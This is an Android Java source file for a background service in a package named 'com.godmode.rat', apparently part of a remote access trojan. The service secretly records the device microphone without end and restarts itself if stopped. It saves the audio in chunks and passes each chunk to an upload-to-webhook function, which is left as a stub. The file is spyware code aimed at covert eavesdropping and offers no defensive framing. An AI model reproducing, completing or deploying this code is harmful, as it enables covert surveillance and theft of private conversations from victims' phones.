package com.godmode.rat;

import android.app.Service;
import android.content.Intent;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.IBinder;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class AudioRecorderService extends Service {
    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
    
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private Thread recordingThread;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startRecording();
        return START_STICKY;
    }

    private void startRecording() {
        audioRecord = new AudioRecord(
            MediaRecorder.AudioSource.MIC,
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT,
            BUFFER_SIZE
        );
        
        audioRecord.startRecording();
        isRecording = true;
        
        recordingThread = new Thread(() -> {
            byte[] buffer = new byte[BUFFER_SIZE];
            while (isRecording) {
                int bytesRead = audioRecord.read(buffer, 0, BUFFER_SIZE);
                if (bytesRead > 0) {
                    try {
                        // Save the 5-second chunk to a file
                        File outputFile = new File(getFilesDir(), "audio_chunk_" + System.currentTimeMillis() + ".pcm");
                        FileOutputStream fos = new FileOutputStream(outputFile);
                        fos.write(buffer, 0, bytesRead);
                        fos.close();
                        
                        // Upload to webhook here
                        uploadToWebhook(outputFile);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        
        recordingThread.start();
    }

    private void uploadToWebhook(File file) {
        // Implement HTTP POST to your webhook URL
        // Use OkHttp or HttpURLConnection
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
    }

    private void stopRecording() {
        isRecording = false;
        if (audioRecord != null) {
            audioRecord.stop();
            audioRecord.release();
            audioRecord = null;
        }
        if (recordingThread != null) {
            try {
                recordingThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
